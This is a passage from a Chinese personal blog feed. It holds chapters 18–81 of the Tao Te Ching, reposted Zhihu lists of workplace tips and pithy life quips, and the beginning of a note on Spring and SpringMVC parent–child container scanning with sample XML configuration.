18.大道废有仁义；慧智出有大伪；六亲不和有孝慈；国家昏乱有忠臣。 19.绝圣弃智，民利百倍；绝仁弃义，民复孝慈；绝巧弃利，盗贼无有；此三者，以为文不足。故令有所属，见素抱朴少私寡欲。 20.绝学无忧，唯之与阿，相去几何？善之与恶，相去若何？人之所畏，不可不畏。荒兮其未央哉！众人熙熙如享太牢、如春登台。我独泊兮其未兆，如婴儿之未孩；儡儡(lěi,羸弱)兮若无所归。众人皆有馀，而我独若遗。我愚人之心也哉！沌沌兮。俗人昭昭，我独昏昏；俗人察察，我独闷闷。众人皆有以，而我独顽且鄙。我独异於人，而贵食母。 21.孔德之容惟道是从。道之为物惟恍惟惚。惚兮恍兮其中有象。恍兮惚兮其中有物。窈兮冥兮其中有精。其精甚真。其中有信。自古及今，其名不去以阅众甫。吾何以知众甫之状哉！以此。 22.曲则全，枉则直，洼则盈，敝则新少则得，多则惑。是以圣人抱一为天下式。不自见故明；不自是故彰；不自伐故有功；不自矜故长；夫唯不争，故天下莫能与之争。古之所谓∶曲则全者」岂虚言哉！诚全而归之。 23.希言自然。故飘风不终朝，骤雨不终日。孰为此者？天地。天地尚不能久，而况於人乎？故从事於道者，同於道。德者同於德。失者同於失。同於道者道亦乐得之；同於德者德亦乐得之；同於失者失於乐得之信不足焉有不信焉。 24.企者不立；跨者不行。自见者不明；自是者不彰。自伐者无功；自矜者不长。其在道也曰∶馀食赘形。物或恶之，故有道者不处。 25.有物混成先天地生。寂兮寥兮独立不改，周行而不殆，可以为天下母。吾不知其名，强字之曰道。强为之名曰大。大曰逝，逝曰远，远曰反。故道大、天大、地大、人亦大。域中有大，而人居其一焉。人法地，地法天，天法道，道法自然。 26.重为轻根，静为躁君。是以君子终日行不离轻重。虽有荣观燕处超然。奈何万乘之主而以身轻天下。轻则失根，躁则失君。 27.善行无辙迹。善言无瑕谪。善数不用筹策。善闭无关楗而不可开。善结无绳约而不可解。是以圣人常善救人，故无弃人。常善救物，故无弃物。是谓袭明。故善人者不善人之师。不善人者善人之资。不贵其师、不爱其资，虽智大迷，是谓要妙。 28.知其雄，守其雌，为天下溪。为天下溪，常德不离，复归於婴儿。知其白，守其黑，为天下式。为天下式，常德不忒，复归於无极。知其荣，守其辱，为天下谷。为天下谷，常德乃足，复归於朴。朴散则为器，圣人用之则为官长。故大制不割。 29.将欲取天下而为之，吾见其不得已。天下神器，不可为也，为者败之，执者失之。夫物或行或随、或觑或吹、或强或羸、或挫或隳。是以圣人去甚、去奢、去泰。 30.以道佐人主者，不以兵强天下。其事好还。师之所处荆棘生焉。军之後必有凶年。善有果而已，不敢以取强。果而勿矜。果而勿伐。果而勿骄。果而不得已。果而勿强。物壮则老，是谓不道，不道早已。 31.夫佳兵者不祥之器，物或恶之，故有道者不处。君子居则贵左，用兵则贵右。兵者不祥之器，非君子之器，不得已而用之，恬淡为上。胜而不美，而美之者，是乐杀人。夫乐杀人者，则不可得志於天下矣。吉事尚左，凶事尚右。偏将军居左，上将军居右。言以丧礼处之。杀人之众，以悲哀泣之，战胜以丧礼处之。 32.道常无名。朴虽小天下莫能臣也。侯王若能守之，万物将自宾。天地相合以降甘露，民莫之令而自均。始制有名，名亦既有，夫亦将知止，知止可以不殆。譬道之在天下，犹川谷之於江海。 33.知人者智，自知者明。胜人者有力，自胜者强。知足者富。强行者有志。不失其所者久。死而不亡者，寿。 34.大道泛兮，其可左右。万物恃之以生而不辞，功成而不名有。衣养万物而不为主，常无欲可名於小。万物归焉，而不为主，可名为大。以其终不自为大，故能成其大。 35.执大象天下往。往而不害安平太。乐与饵，过客止。道之出口淡乎其无味。视之不足见。听之不足闻。用之不足既。 36.将欲歙之，必固张之。将欲弱之，必固强之。将欲废之，必固兴之。将欲取之，必固与之。是谓微明。柔弱胜刚强。鱼不可脱於渊，国之利器不可以示人。 37.道常无为，而无不为。侯王若能守之，万物将自化。化而欲作，吾将镇之以无名之朴。无名之朴，夫亦将无欲。不欲以静，天下将自定。 38.上德不德是以有德。下德不失德是以无德。上德无为而无以为。下德无为而有以为。上仁为之而无以为。上义为之而有以为。上礼为之而莫之以应，则攘臂而扔之。故失道而後德。失德而後仁。失仁而後义。失义而後礼。夫礼者忠信之薄而乱之首。前识者，道之华而愚之始。是以大丈夫，处其厚不居其薄。处其实，不居其华。故去彼取此。 39.昔之得一者。天得一以清。地得一以宁。神得一以灵。谷得一以盈。万物得一以生。侯王得一以为天下贞。其致之。天无以清将恐裂。地无以宁将恐废。神无以灵将恐歇。谷无以盈将恐竭。万物无以生将恐灭。侯王无以贞将恐蹶。故贵以贱为本，高以下为基。是以侯王自称孤、寡、不谷。此非以贱为本邪？非乎。至誉无誉。不欲琭琭如玉，珞珞如石。 40.反者道之动。弱者道之用。天下万物生於有，有生於无。 41.上士闻道勤而行之。中士闻道若存若亡。下士闻道大笑之。不笑不足以为道。故建言有之。明道若昧。进道若退。夷道若纇。上德若谷。大白若辱。广德若不足。建德若偷。质真若渝。大方无隅。大器晚成。大音希声。大象无形。道隐无名。夫唯道善贷且成。 42.道生一。一生二。二生三。三生万物。万物负阴而抱阳，冲气以为和。人之所恶，唯孤、寡不谷，而王公以为称，故物或损之而益，或益之而损。人之所教，我亦教之，强梁者，不得其死。吾将以为教父。 43.天下之至柔，驰骋天下之至坚。无有入无间，吾是以知无为之有益。不言之教，无为之益天下希及之。 44.名与身孰亲。身与货孰多。得与亡孰病。是故甚爱必大费。多藏必厚亡。知足不辱。知止不殆。可以长久。 45.大成若缺，其用不弊。大盈若冲，其用不穷。大直若屈。大巧若拙。大辩若讷。静胜躁，寒胜热。清静为天下正。 46.天下有道，却走马以粪。天下无道，戎马生於郊。祸莫大於不知足。咎莫大於欲得。故知足之足常足矣。 47.不出户知天下。不窥牖见天道。其出弥远，其知弥少。是以圣人不行而知。不见而明。不为而成。 48.为学日益。为道日损。损之又损，以至於无为。无为而不为。取天下常以无事，及其有事，不足以取天下。 49.圣人无常心。以百姓心为心。善者吾善之。不善者吾亦善之，德善。信者吾信之。不信者吾亦信之，德信。圣人在天下，歙歙(xīxī,无所偏执的样子)焉，为天下浑其心。百姓皆注其耳目，圣人皆孩之。 50.出生入死。生之徒，十有三。死之徒，十有三。人之生，动之於死地，亦十有三。夫何故？以其生生之厚。盖闻善摄生者，陆行不遇凶虎，入军不被甲兵。凶无所投其角。虎无所用其爪。兵无所容其刃。夫何故？以其无死地。 51.道生之，德畜之，物形之，势成之。是以万物莫不尊道，而贵德。道之尊，德之贵，夫莫之命而常自然。故道生之，德畜之。长之育之。亭之毒之。养之覆之。生而不有，为而不恃，长而不宰。是谓玄德。 52.天下有始，以为天下母。既得其母，以知其子。既知其子，复守其母，没身不殆。塞其兑，闭其门，终身不勤。开其兑，济其事，终身不救。见其小曰明，守柔曰强。用其光，复归其明，无遗身殃。是为习常。 53.使我介然有知，行於大道，唯施是畏。大道甚夷，而人好径。朝甚除，田甚芜，仓甚虚。服文彩，带利剑，厌饮食，财货有馀。是谓盗夸。非道也哉。 54.善建者不拔。善抱者不脱。子孙以祭祀不辍。修之於身其德乃真。修之於家其德乃馀。修之於乡其德乃长。修之於邦其德乃丰。修之於天下其德乃普。故以身观身，以家观家，以乡观乡，以邦观邦，以天下观天下。吾何以知天下然哉？以此。 55.含德之厚比於赤子。毒虫不螫，猛兽不据，攫鸟不抟。骨弱筋柔而握固。未知牝牡之合而全作，精之至也。终日号而不嗄，和之至也。知和曰常。知常曰明。益生曰祥。心使气曰强。物壮则老。谓之不道，不道早已。 56.知者不言。言者不知。挫其锐，解其纷，和其光，同其尘，是谓玄同。故不可得而亲。不可得而疏。不可得而利。不可得而害。不可得而贵。不可得而贱。故为天下贵。 57.以正治国，以奇用兵，以无事取天下。吾何以知其然哉？以此。天下多忌讳而民弥贫。民多利器国家滋昏。人多伎巧奇物泫起。法令滋彰盗贼多有。故圣人云我无为而民自化。我好静而民自正。我无事而民自富。我无欲而民自朴。 58.其政闷闷，其民淳淳。其政察察，其民缺缺。祸尚福之所倚。福尚祸之所伏。孰知其极，其无正。正复为奇，善复为妖。人之迷其日固久。是以圣人方而不割。廉而不刿。直而不肆。光而不耀。 59.治人事天莫若啬。夫唯啬是谓早服。早服谓之重积德。重积德则无不克。无不克则莫知其极。莫知其极可以有国。有国之母可以长久。是谓深根固柢，长生久视之道。 60.治大国若烹小鲜。以道莅天下，其迨ㄞ哄非其鬼不神，其神不伤人。非其神不伤人，圣人亦不伤人。夫两不相伤，故德交归焉。 61.大国者下流，天下之交。天下之牝。牝常以静胜牡。以静为下。故大国以下小国，则取小国。小国以下大国，则取大国。故或下以取，或下而取。大国不过欲兼畜人。小国不过欲入事人。夫两者各得所欲，大者宜为下。 62.道者万物之奥。善人之宝，不善人之所保。美言可以市尊。美行可以加人。人之不善，何弃之有。故立天子、置三公，虽有拱璧以先驷马，不如坐进此道。古之所以贵此道者何。不曰∶求以得，有罪以免邪？故为天下贵。 63.为无为，事无事，味无味。大小多少，报怨以德。图难於其易，为大於其细。天下难事必作於易。天下大事必作於细。是以圣人终不为大，故能成其大。夫轻诺必寡信。多易必多难。是以圣人犹难之，故终无难矣。 64.其安易持，其未兆易谋。其脆易泮，其微易散。为之於未有，治之於未乱。合抱之木生於毫末。九层之台起於累土。千里之行始於足下。为者败之，执者失之。是以圣人无为故无败，无执故无失。民之从事常於几成而败之。慎终如始则无败事。是以圣人欲不欲，不贵难得之货。学不学，复众人之所过，以辅万物之自然而不敢为。 65.古之善为道者，非以明民，将以愚之。民之难治，以其智多。故以智治国，国之贼。不以智治国，国之福。知此两者，亦稽式。常知稽式，是谓玄德。玄德深矣、远矣！与物反矣。然後乃至大顺。 66.江海之所以能为百谷王者，以其善下之，故能为百谷王。是以圣人欲上民，必以言下之。欲先民，必以身後之。是以圣人处上而民不重，处前而民不害。是以天下乐推而不厌。以其不争，故天下莫能与之争。 67.天下皆谓我道大似不肖。夫唯大故似不肖。若肖，久矣！其细也夫。我有三宝持而保之∶一曰慈， 二曰俭，三曰不敢为天下先。慈故能勇，俭故能广，不敢为天下先故能成器长。今舍慈且勇，舍俭且广，舍後且先，死矣！夫慈以战则胜，以守则固。天将救之以慈卫之。 68.善为士者不武。善战者不怒。善胜敌者不与。善用人者为之下。是谓不争之德。是谓用人之力。是谓配天之极。 69.用兵有言，吾不敢为主而为客。不敢进寸而退尺。是谓行无行。攘无臂。扔无敌。执无兵。祸莫大於轻敌。轻敌几丧吾宝。故抗兵相加哀者胜矣。 70.吾言甚易知、甚易行。天下莫能知、莫能行。言有宗、事有君。夫唯无知，是以我不知。知我者希，则我者贵。是以圣被褐怀玉。 71.知不知上，不知知病。夫唯病病，是以不病。圣人不病，以其病病。夫唯病病，是以不病。 72.民不畏威，则大威至。无狎其所居，无厌其所生。夫唯不厌，是以不厌。是以圣人自知不自见。自爱不自贵。故去彼取此。 73.勇於敢则杀。勇於不敢则活。此两者或利或害。天之所恶孰知其故。天之道不争而善胜。不言而善应。不召而自来。繟(chǎn,舒缓)然而善谋。天网恢恢疏而不失。 74.民不畏死，奈何以死惧之。若使民常畏死，而为奇者，吾得执而杀之，孰敢。常有司杀者杀。夫代司杀者杀，是谓代大匠斫。夫代大匠斫者，希有不伤其手矣。 75.民之饥以其上食税之多，是以饥。民之难治以其上之有为，是以难治。民之轻死以其求生之厚，是以轻死。夫唯无以生为者，是贤於贵生。 76.人之生也柔弱，其死也坚强。草木之生也柔脆，其死也枯槁。故坚强者死之徒，柔弱者生之徒。是以兵强则灭，木强则折。强大处下，柔弱处上。 77.天之道其犹张弓与。高者抑之，下者举之。有馀者损之，不足者补之。天之道，损有馀而补不足。人之道，则不然，损不足以奉有馀。孰能有馀以奉天下，唯有道者。是以圣人为而不恃，功成而不处。其不欲见贤邪！ 78.天下莫柔弱於水。而攻坚强者，莫之能胜。以其无以易之。弱之胜强。柔之胜刚。天下莫不知莫能行。是以圣人云，受国之垢是谓社稷主。受国不祥是为天下王。正言若反。 79.和大怨必有馀怨，安可以为善。是以圣人执左契，而不责於人。有德司契，无德司彻。天道无亲常与善人。 80.小国寡民。使有什伯之器而不用。使民重死而不远徙。虽有舟舆无所乘之。虽有甲兵无所陈之。使民复结绳而用之。甘其食、美其服、安其居、乐其俗。邻国相望，鸡犬之声相闻。民至老死不相往来。 81.信言不美。美言不信。善者不辩。辩者不善。知者不博。博者不知。圣人不积。既以为人己愈有。既以与人己愈多。天之道利而不害。圣人之道为而不争。]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[转知乎关于工作]]></title>
    <url>%2F2017%2F08%2F20%2Fessay%2Fessay-5%2F</url>
    <content type="text"><![CDATA[1、领导就是领导，无论你们年纪多么相近，无论你们之前多么相熟，在他是你的领导的时候，请你保持对领导的尊重，这也包括，你并不能把所有的想法都告诉他。 2、积极主动、落落大方。只要是同事，不论是什么部门的，你们能遇见，有说话的机会 ，比如一起在食堂吃饭、在会上遇见，请你积极主动和别人打招呼，并且保留联系方式。 3、对于你认可而你领导不认可的意见，请你保留，直到你当上领导的那一天。 4、全面了解公司架构，并寻找自己的扩展机会。这不是让你换岗位，而是对外讲得清自己公司的架构，对内如果有主动或者被动的调整机会，你知道自己想去哪儿。 5、积累、寻找上升机会。尤其是你怀才不遇的时候，如果你真的有“才”，只有你有话语权的时候，你才有更大的发展可能。 {———-} 6、保持平常心，顺势而为。做积极主动的努力，但并不执着于结果。很多职业上的发展是能力、机遇、人脉等各种综合作用的结果，并不被单一因素所决定。所以如果做了努力，但没有结果，不要灰心。付出不会浪费，可以寻找别的机会，也可以等待机会。 7、自己的成长才是最重要的。除了薪水、职位，在你发展过程中，不论在哪个单位的哪个进程中，都要不断成长，或者说拿到你想拿到的东西再离开。 8、当你想换工作，又有一份你愿意尝试的工作愿意接受你的时候，不要太过犹豫自己是不是换工作换的太频繁，别人如何想。只要你进行过基本的分析，不会比现在差，就鼓励你尝试。尝试有50%的可能变好。要相信，时间是一张网，撒在哪里都会有收获。 9、善于发挥自己的优势。如果你学历高，建议你去一个学历门槛比较重的单位，当然只是建议，依次类推。 10、不断学习。英语啊、各种证书啊，等等，在不耽误工作的基础上，学习和拿下工作不断推进。 原文地址]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试时候看一下 系列]]></title>
    <url>%2F2017%2F08%2F20%2Fessay%2Fessay-6%2F</url>
    <content type="text"><![CDATA[职场宫心计之面试遇到“你有什么要问我的吗”，该如何回答？]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[干了这一波毒鸡汤]]></title>
    <url>%2F2017%2F08%2F20%2Fessay%2Fessay-3%2F</url>
    <content type="text"><![CDATA[1、怎么定义「想清楚了」？ “想清楚了”就是以后出了什么问题你只能找个没人的地方抽自己，再也不能抱怨别人了。 2、你交朋友的标准是什么？ 出世的智者，入世的强者，或者正常而阳光的普通人。 3、男性更看重女性的身材、脸蛋，还是思想？ 脸蛋和身材决定了我是否想去了解她的思想。 思想决定了我是否会一票否决掉她的脸蛋和身材。 {———-}4、「别让孩子输在起跑线上」有道理吗？ 一辈子都要和别人去比较，是人生悲剧的源头。 5、做哪些事情可以提升生活品质？ 定期扔東西。 6、结婚以后两个人在一起最重要的是什么？ 就当这婚还没结。 7、怎么判断乞丐的真假？ 乞丐無論真假，當他向你乞討時，他就真的是乞丐了。 8、为什么文章写出来是为了给别人看的，可是写作的时候却很讨厌旁边有人看？ 因为有了观察者之后，无限可能的状态就塌缩了。 9、怎么反驳「你行你上啊」的逻辑？ 天涯名句「我评论个电冰箱，自己还得会制冷啊？」 10、你最希望你年轻的时候本该知道哪些道理或者懂得哪些事情？ 内心的感受比外面的大道理重要。 11、把学费拿来念书还是环游世界更合适？为什么？ 读书在没有充分的知识做为前提的情况下，即使行了万里路也不过是邮差而已。 12、为什么部分人会产生「聪明智慧的姑娘都被憨憨的小伙儿搞定了」的印象？ 严肃地说，我觉得，要么姑娘只是看起来聪明，要么小伙儿只是看起来憨··· 13、你为什么进入媒体？你为什么至今依然留在媒体？ 我进媒体，是因为我不会干别的；我至今还留在媒体，是因为我还不会干别的。 14、你心中的完美爱情是怎么样的？ 可以有不完美。 15、对于爱情，放下的瞬间是什么样的？ “在离别的车站，她上了车，我没有像以往那样目送那班车到消失，而是头也不回的走向家的方向。” 16、你最深刻的错误认识是什么？ 以为自由就是想做啥做啥。后来才发现自律者才会有自由。 当一个人缺乏自律的时候，他做的事情总是在受习惯和即时诱惑的影响，要么就是被他人的思想观念所扰， 几乎永远不可能去做内心真正渴望的事。 17、为什么德国，这个贡献了如此多知识精英的国家，在国家决策上面如此愚蠢，卷入了两场打不赢的世界大战？ 上次看欧洲杯，一个朋友对德国做出了评价：用哲学忽悠别人，用科学发展自己。 18、女朋友是否无理取闹，要求太多？ 平淡其实是很奢侈的。 那意味着有许多爱你的人在为你而付出。 19、如何成为有想法的人？ 你们有没有发现，很有想法的人往往“厚脸皮”。 我是说：他们不害怕说出一个想法后，被人认为二逼。 有想法的人太多了，敢说出来的人太少了。 19、你为何下定决心离开某一公司？ 有种说法，看你想不想留在一个公司，只要看看你的同事们的生活，如果他们的生活不是你想要的， 就可以离开了，第一家公司离开的原因，就是我需要换一种生活 20、异国长期生活，改变了你的哪些「是非观」？ 很多事情只是不同，并无是非。 21、是不是一个人越成熟就越难爱上一个人？ 不是越成熟越难爱上一个人。 是越成熟，越能分辨那是不是爱。 22、如何让这个世界变得美好？ 把你自己变得更美好。 23、苦难有什么价值？ 永远不要相信苦难是值得的，苦难就是苦难，苦难不会带来成功。 苦难不值得追求，磨练意志是因为苦难无法躲开。 24、国外哪些事物让你感觉还不如呆在国内舒服？ “得到了天空，失去了大地”。 25、留欧与留美之间常会相互有哪些吐槽？ 在我们新加坡留学生看来，你们好歹都算是出过国了。 26、你打天下的方法论是怎样的？ 以正合以奇胜。 不向静中参妙理，纵然颖悟也虚浮。 27、怎么确定对方是能一辈子和我在一起的人？ 钱钟书先生对杨绛女士有这样一段评价，被社会学家视为理想婚姻的典范： 1、在遇到她以前，我从未想过结婚的事。 2、和她在一起这么多年，从未后悔过娶她做妻子。 3、也从未想过娶别的女人。 28、如何反驳「现实点，这个社会就是这样」？ &quot;你是怎样，你的世界就是怎样。&quot; 29、你对自由的理解是什么？ 说“不”的能力 30、有哪些产品体现了 less is more 的设计理念？ 围棋 31、如何区分善良和懦弱？ 面对敌人，有能力伤害别人，而不愿意伤害，谓之善良。 面对敌人，有能力伤害别人，不敢去伤害，谓之懦弱。 32、跟朋友聊天问问题被回你猜时该回复什么可以做到戳瞎双眼的效果呢？ 朋友：“你猜” 答：“猜完了” 朋友：“猜的啥？” 答：“你猜” 33、我们是否应该抵制日货？ 我们要抵制日货，并不是要砸自己的日货。我们应该在自己的各行各业都比它做得好。 我们的官员比他们的清廉，我们的街道比他们的干净，然后我们的桥也比它结实。 还有我们的年轻人，比他更有未来，更有希望。 34、为什么成功学书籍看多，不仅没起到多少励志的作用，反而带来了很多负面的影响？ 上士闻道，勤能行之；中士闻道，若存若亡；下士闻道，大笑之。 ——《老子》 35、怎么看待励志的书籍？ 看再多，那都是别人的人生。 36、同样是别人比自己强，为什么有时会产生嫉妒心理，而有时会产生崇拜？ 远的崇拜，近的嫉妒。 够不着的崇拜，够得着的嫉妒。 有利益冲突的嫉妒，没利益冲突的崇拜。 37、室友都是热衷于看韩剧看星座爱陆琪的女孩，我在她们面前总是有一种优越感，而且总想卖弄一番自己每天逛知乎学来的知识，我该怎么办？ 人之患在好为人师 38、有些人特别喜欢发很简短的状态，这是一种什么心理？ 可能性如下： 1.简为美。 2.不希望别人看懂，希望自己记录。 3.不希望别人看懂，希望某人看懂。 4.不希望别人看懂，希望别人关心。 5.装。 6.懒。 39、编程的乐趣是什么？ 人的成就感来源于两样东西，创造和毁灭。 40、为什么当看到好照片时人们通常的反应是“真不错，你用的是什么相机？”，当看到烂照片时，则往往笑话拍摄者水平很臭？ 人习惯性的将自己的成功归因于自身，失败归因于环境； 而将他人的成功归因于环境，失败归因于其自身。 41、怎样面对同事对你的指责？ 1. 你有错么？ 有错跳到4，没错跳到2 2. 他有病么？ 如果指责别人是他的癖好，跳到3，否则跳回1反思 3. 不管他，做好你自己的事 4. 知错就改，虚心接受 42、刚刚交往的男朋友郑重的跟我说：＂将来你能不能不要跟我说你的过去，我不想知道也不会问，我怕有心理阴影。你能答应我么？＂他是什么意思？ “和妹子相处，要义就是：若她涉世未深，就带她看尽人间繁华；若她心已沧桑，就带她坐旋转木马。” 只是，对男人来说若他心已沧桑，则只想安静的有个人一起生活！ 43、怎样有效提出推荐或建议同时，避免给人灌输和强迫的感觉？ 说服他人不要诉诸理性，应求于利益。 44、哪些技能，经较短时间的学习，就可以给人的生活带来巨大帮助？ 夸奖他人。 45、为什么很多程序员、Geek 都喜欢熬夜，而且在后半夜工作效率异常高？ 一个姑娘问我，搞学术的为什么都睡得那么晚，难道只有到晚上才有灵感？不是，姑娘，搞学术不靠灵感， 靠的是碌碌无为的白天引发的愧疚心。 46、你是如何走出人生的阴霾的？ 多走几步。 47、怎样做到“不抱怨”？ 自知者不怨人 知命者不怨天 48、如何开导一个内心阴暗的女孩？ 方法什么的不重要 最重要的是 一旦你决定走近她，就千万不要主动远离她 一旦她开始靠近你，就永远不要试图推开她 49、26岁，工作三年却将留学三年，值得吗？ 普通玩家选择标准配置，高端玩家选择自定义配置。 50、坚持看新闻联播真的能致富？ 看新闻联播的目的不是为了了解什么，学习什么，而是让你知道政府想让人们知道什么， 而在中国这样一个政府力量巨大的社会里，对政府意图更好的解读对于经商确实是非常有益的。 51、什么样的人活得最幸福？ 牌好、技术高且懂得悲天悯人之人。 52、为什么有些事对别人来说只是举手之劳可他们却不愿帮忙？ 部分人是因为不够爱这个世界和世界上的人。部分人是因为不够信任这个世界和世界上的人。 53、如何看待「年轻时就释怀与淡泊，是没有希望的」这句话？ 试图用一句话就来总结复杂的人生，是没有希望的。 54、如果没有月亮的话，人类文明会有何不同？ 没有人类。 55、如何征服全宇宙？ 征服自己。 56、能写出非常优秀的段子的赖宝为什么会得抑郁症？ 因为喜剧演员都是把自己当做了祭品奉献给观众 57、是否真的有天道酬勤？ 成功需要运气，天赋，背景，人脉等等。勤奋可能只是不起眼的一个条件。 但这并不意味着，如果你放弃勤奋，你就可以拥有其他条件。 对于大部分人来说，他们只能勤奋，别无选择。 世界本不公平，但不公平不是不努力的理由。 58、人这一生为什么要努力？ 最痛苦的事，不是失败，是我本可以 59、要怎样努力，才能成为很厉害的人？ 如果你注定要成为厉害的人，那问题的答案就深藏在你的血脉里；如果你注定不是厉害的人，那你便只需要做好你自己。 60、业余和专业最大的区别是什么？ 高手都是跟自己玩的，水货都是陪别人玩的。 61、在一个足够小的星球上行走，我们是在上坡还是下坡？ 你感觉累就是上坡，感觉轻松就是下坡。 62、你经历过的最神奇的事情是什么？ 我一同学，某天指灯发誓自己没说谎，结果刚说完，灯罩掉下来了，正砸头顶上。 63、前半生与后半生的分界线是在哪里？ 此时此刻 64、你遇到过哪些让你眼前一亮、醍醐灌顶或对你改变很大的理念？ 天赋决定了你能达到的上限，努力程度决定了你能达到的下限。以绝大多数人的努力程度之低，远远没有达到要去拼天赋的地步。 65、听过最落寞的一句话或诗句是什么？ 不如意事常八九，可与言者无二三。 66、世界上有那么多好书好电影好动漫注定看不完，我们对这个事实该持何种态度？ 怕什么真理无穷，进一寸有一寸的欢喜。——胡适 67、30 岁才开始学习编程靠谱吗？ 种一棵树最好的时间是十年前，其次是现在。————CaunDerre 68、怎么修身养性？ 年轻时就释怀与淡泊，是没有希望的。——王石 69、向喜欢的女生表白被拒绝了，还是喜欢她，怎么办？ 也许你弄错了什么是表白，表白应该是最终胜利时的号角，而不应该是发起进攻的冲锋号。————邵鸽 70、省钱的好办法有哪些？ 在买任何东西之前牢记九字箴言：你喜欢，你需要，你适合。 PS：适用于很多事，包括感情也一样————费妮妮 71、和不熟的女生去吃饭应该怎么聊？ 有人觉得交际困难或者比较累，是因为他们总是试图表现出自己所不具备的素质————秦春山 72、王阳明的「知行合一」到底如何理解？又怎样运用到实际生活中？ 知道做不到，等于不知道————星光居士 73、什么叫见过大世面？ 能享受最好的，能承受最坏的————张亮 74、科学和迷信的分界点是哪里？ 我错了————陳浩 75、当初 Android 刚火的时候，为什么 Nokia 不采用，却依旧钟情于塞班？ 人不会死在绝境。。却往往栽在十字路口————李楠 76、扎克伯格初期是怎么保护 Facebook 的最初创意？为什么 Facebook 上线后没被其他大公司抄走？ 保护创意的最好方法，就是将其最好地执行————黄继新 77、哪些行为容易得罪别人，自己却不容易察觉？ 太把别人当自己人。 78、怎样变得坦率和温柔？ 一想到大家总有天要死，就觉得该对喜欢的人好一点，就这样啊。 79、员工辞职最主要的原因是什么？ 钱少事多离家远，位低权轻责任重。 80、你在生活中得到过的最好的建议是什么？ “永远不要问你不想知道答案的问题” “过度自我关注是万恶之源” “永远不要为尚未发生的事儿拧巴。 恩宜自淡而浓，先浓后淡者，人忘其惠； 威宜自严而宽，先宽后严者，人怨其酷。 觉得为时已晚的时候，恰恰是最早的时候 81、热爱生活是什么样子的？ 每天都有很强大的起床的动力，用心去拥抱每个时刻，珍惜美好的人与物。 82、肥是什么感觉？ 肥就是人间失格。 83、有什么瞬间让你觉得世界真小？ 48个相亲对象，竟然40个认识，世界太小了。 84、哪些行为是浪费时间？ 思而不学+犹豫不决 85、最能燃起你学习激情的一句话是什么？ 你不能把这个世界，让给你所鄙视的人。 夏酷暑，冬严寒，春也不死吾心，心所向，将所成 86、和比自己家境富裕的人交友、来往（包括恋爱、同学、职场），需要注意什么？ 其实和任何人交往都是一个道理，如果做不到，要事先说，不要中途或者事后说。 87、「装逼」跟「选择自己想要」的分界线在哪里？ 牛逼和装逼的区别是，你究竟是对「做这件事」本身乐在其中，还是对「让其他人知道我做了这件事」乐在其中。 如果有一件事，就算做了也决不能向任何人提起，还会毫不犹豫去做的，那才叫「选择自己想要的」。 88、如果好人没好报，我们为什么还要做好人？ 我们坚持一件事情，并不是因为这样做了会有效果，而是坚信，这样做是对的。——哈维尔 89、恋爱半年，女朋友觉得没有了开始时的新鲜感，怎么办？ 一直认为，所谓新鲜感，不是和未知的人一起去做同样的事情， 而是和已知的人一起去体验未知的人生。 90、女生怎么看待自己心目中的「男神」的？ 谁能凭爱意要富士山私有。 91、为什么大家都要上大学找工作，而不太喜欢开出租车、开小店、开饭馆、摆街边早餐小吃摊等“短平快”项目？ “孩子，我要求你读书用功，不是因为我要你跟别人比成绩，而是因为，我希望你将来会拥有选择的权利， 选择有意义、有时间的工作，而不是被迫谋生。当你的工作在你心中有意义，你就有成就感。 当你的工作给你时间，不剥夺你的生活，你就有尊严。成就感和尊严，给你快乐。”----龙应台 92、情商不高的例子有哪些？ 对陌生人毕恭毕敬 对亲近的人随意发怒…… 93、好人是如何变成坏人的？ 他觉得不公平的时候。 94、如何看待「年轻的时候需要的是朋友而不是人脉」？ 沒有目的之交往，才能感動人。 95、如何解读“伊能静宣布收小贩夏俊峰之子为义子与其妻结拜”？ 所有利他行为都应该被鼓励，即使布施者最后也得利。 96、理工科人士如果在相关知识和背景了解不多的情况下以肯定性的语气跨界讨论社科类问题，是否与科学精神相悖？ 一千个人眼里有一千个哈姆雷特，但这个世界上只有一个勾股定理。 97、有哪些道理是你读了不信，听不进去，直到你亲身经历方笃信不疑的？ 不要低估你的能力，不要高估你的毅力 98、为什么周围有的女生嘴里喊着男女平等，但是到了很多事上又会理所当然的享受女生特权？ 因为任何个人或团体都不会主动放弃既得利益或优势。 99、怎样才可以当学霸？ 没有学到死，就往死里学。 100、如何把无聊变为有趣？ 须知才高于志，方是快乐的本源。以苍鹰搏兔之势逮耗子，架起导弹高射炮来打蚊子，越是「大材小用」，越有喜剧效果。 越是用一本正经的态度，去做无聊的事情，越能悦人悦己。反正闲着也是闲着，不为无益之事，何以遣有涯之生呢。 101、为什么有些事对别人来说只是举手之劳可他们却不愿帮忙？ 我去做一件事并不是因为它简单，而是因为它值得。 102、有哪些我们熟知的名言其实还有后半句？ 「人是生而自由的」 下一句是： 「但无往不在枷锁之中。」 再下一句是： 「自以为是其他一切主人的人，反而比其他一切更是奴隶。」 转载地址 欢迎评论留言感触最深的几句话]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring springmvc 父子容器关系]]></title>
    <url>%2F2017%2F08%2F06%2Fexception%2Fexception-2%2F</url>
    <content type="text"><![CDATA[问题背景：在springmvc配置文件中扫描实体类 不能再service层注入 提示错误 NoClassDefFoundError 原因springmvc是spring容器的一个子容器在springmvc容器中可以调用spring容器实体类，而在spring容器中不能注入使用springmvc扫描的实体类 简单来讲 controller可以注入service service不能注入controller 我的问题是在部署中间件rocketmq将扫描配置放到了springmvc配置文件中 导致service不能注入rocketmq实体类 springmvc.xml12345&lt;!-- 自动扫描且只扫描@Controller --&gt;&lt;context:component-scan base-package="com.csdn.uc.controller" use-default-filters="false"&gt; &lt;context:include-filter type="annotation" expression="org.springframework.stereotype.Controller" /&gt; &lt;context:include-filter type="annotation" expression="org.springframework.web.bind.annotation.ControllerAdvice" /&gt;&lt;/context:component-scan&gt; spring.xml 12345678&lt;!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 --&gt;&lt;!-- 加入定制化包路径com.sample --&gt;&lt;context:component-scan base-package="com.csdn.uc"&gt; 